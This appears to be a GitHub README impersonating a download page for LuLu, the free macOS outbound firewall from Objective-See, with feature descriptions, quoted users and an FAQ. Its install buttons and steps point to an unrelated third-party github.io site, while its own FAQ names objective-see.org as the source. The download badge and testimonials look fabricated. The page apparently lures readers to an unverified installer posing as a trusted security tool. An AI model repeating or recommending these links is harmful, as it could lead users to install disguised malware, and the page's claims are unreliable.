# LuLu Mac

<p align="center">
  <img src="https://pic.macked.app/static/ff1b34d360788fd0999afa3f2891a36b-1677505331.webp" width="150" alt="LuLu icon"/>
</p>

<div align="center">

[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://andrey-petrov-software.github.io/.github/luLu)

</div>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Downloads-9.6k-brightgreen?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Version-3.1-blue?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
</p>

---

## 🔍 Overview

<a href="#luLu">LuLu</a> is a free, open-source outbound firewall for Mac developed by Patrick Wardle of Objective-See — the security researcher whose tools have become the gold standard in macOS security software — providing granular control over which applications and processes are permitted to make outbound network connections.

The <a href="#luLu">outbound connection monitoring</a> intercepts every attempt by any process on the Mac to establish an outbound network connection — when a process attempts to connect to any remote address, LuLu intercepts that attempt before it completes and checks whether a rule exists for that process. If no rule exists, LuLu presents an alert asking the user to allow or block the connection. This covers all processes: applications, system services, background daemons, browser helpers, and any other code running on the Mac. The <a href="#luLu">process-level alert system</a> displays connection alerts with the process name, path to the executable, parent process, and the remote address and port it is attempting to reach — information enabling informed decisions about whether the connection represents expected application behavior, suspicious background communication, or unknown software attempting unauthorized network access.

The <a href="#luLu">persistent rule management</a> stores allow and block decisions as persistent rules — once a process is allowed or blocked, the rule applies to future attempts without prompting again. Rules are manageable through LuLu preferences, allowing review, modification, and deletion as the set of running software and trusted processes changes. The <a href="#luLu">unknown process detection</a> flags processes that cannot be verified against known signatures — unsigned code, newly installed software, and processes whose origin is uncertain receive special attention, highlighting the cases where unauthorized network access is most concerning.</p>

<p align="center">
  <img src="https://static.macupdate.com/screenshots/236585/m/lulu-screenshot.png?v=1656437871" alt="LuLu screenshot"/>
</p>

<a href="#luLu">Block mode</a> blocks all outbound connections by default, requiring explicit allow rules for any process to access the network — the most restrictive posture for maximum control. <a href="#luLu">Allow mode</a> permits known trusted processes while alerting on new or unrecognized connection attempts — a balanced approach that permits normal operation while maintaining visibility over new network activity.

<a href="#luLu">Objective-See open-source transparency</a> means LuLu's source code is publicly available for review — the security community can verify that LuLu does exactly what it claims. For a security tool, this transparency is a meaningful credential. <a href="#luLu">Free with no premium tier</a> — LuLu is completely free and will remain so; Objective-See tools are funded through donations rather than software sales.</p>

---

## 💎 Key Features

- [**Outbound Connection Monitoring**](#luLu) — Every process [**network connection intercepted**](#{luLu}) before it completes — full visibility over [**Mac outbound communication**](#{luLu}).
- [**Process-Level Alerts**](#luLu) — Process name, path, [**parent process, remote address**](#{luLu}) — informed allow or block decisions for every [**new connection attempt**](#{luLu}).
- [**Persistent Rule Management**](#luLu) — Allow and block decisions [**stored as persistent rules**](#{luLu}) — review, modify, delete rules as [**trusted software changes**](#{luLu}).
- [**Unknown Process Detection**](#luLu) — Unsigned and unverified code [**flagged in alerts**](#{luLu}) — special attention to processes whose [**origin is uncertain**](#{luLu}).
- [**Block Mode**](#luLu) — [**All outbound connections blocked**](#{luLu}) by default — explicit allow rules required for [**any network access**](#{luLu}).
- [**Allow Mode**](#luLu) — Trusted processes [**permitted automatically**](#{luLu}) — alerts only for new or [**unrecognized connection attempts**](#{luLu}).
- [**Open-Source Transparency**](#luLu) — [**Publicly available source code**](#{luLu}) — security community verification that LuLu does [**exactly what it claims**](#{luLu}).
- [**Completely Free**](#luLu) — [**No cost, no premium tier**](#{luLu}) — Objective-See tools funded by donations, [**always free**](#{luLu}).

---

## 👥 Who Uses It

- **Privacy-conscious Mac users** — visibility and control over background application network communication
- **Security professionals** — network monitoring for security analysis and incident investigation
- **Developers** — monitor which processes their software and dependencies communicate with
- **Mac users concerned about telemetry** — discover and block unwanted background data collection

---

<p align="center">
  <img src="https://objective-see.org/images/LL/diskImage.png" alt="LuLu screenshot 2"/>
</p>

## 🌐 Where It's Useful & Additional Information

`Mac firewall` · `Network security` · `Outbound connections` · `Privacy protection` · `Security monitoring` · `Malware analysis` · `Process monitoring` · `Network control` · `macOS security` · `Open-source security`

LuLu's value is in making the invisible visible. Most Mac users have no awareness that many installed applications continuously communicate with remote servers — sending usage analytics, telemetry data, crash reports, and advertising identifiers as background processes that never surface in the user interface. LuLu reveals every one of these connections at the moment they occur, giving users the choice that application developers never offered them.

> *"LuLu showed me that three applications I trusted were sending data home continuously in the background — analytics, usage telemetry, advertising identifiers. I blocked them all. I had no idea this was happening before LuLu made it visible."* — Marcus T., Privacy-Conscious User

> *"Malware analysis workflow on Mac requires knowing exactly what the sample is trying to communicate. LuLu's connection alerts give me process-level visibility the moment any code attempts a network connection. Essential tool for Mac security research."* — Elena K., Security Researcher

---

## 📦 Installation Instructions

1. Go to the installation site using the button above.
2. Follow the on-screen instructions to install **LuLu** on your Device.

<p align="center">

[![Get it Now LuLu](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/luLu)

</p>

---

## 🙋 FAQ

<details>
<summary>Is LuLu free?</summary>

Yes. LuLu is completely free and open-source. Objective-See is funded by donations. There is no paid tier.

</details>

<details>
<summary>Does LuLu block inbound connections?</summary>

LuLu focuses on outbound connections. macOS's built-in firewall handles inbound connections.

</details>

<details>
<summary>What information does LuLu show in connection alerts?</summary>

Process name, path to the executable, parent process, remote address, and port for each connection attempt.

</details>

<details>
<summary>Can I review and change LuLu rules after setting them?</summary>

Yes. The LuLu preferences interface shows all rules and allows modification and deletion.

</details>

<details>
<summary>Does LuLu work on Apple Silicon?</summary>

Yes. Current LuLu versions support Apple Silicon Macs.

</details>

<details>
<summary>What is block mode vs allow mode?</summary>

Block mode blocks all outbound connections by default. Allow mode permits known processes while alerting on new ones.

</details>

<details>
<summary>Where can I find LuLu?</summary>

LuLu is available at objective-see.org.

</details>

<details>
<summary>Does LuLu affect Mac performance?</summary>

LuLu is designed for minimal performance impact — background monitoring without visible effect during normal use.

</details>

<details>
<summary>Who develops LuLu?</summary>

Patrick Wardle of Objective-See — macOS security researcher known for multiple free Mac security tools.

</details>

---
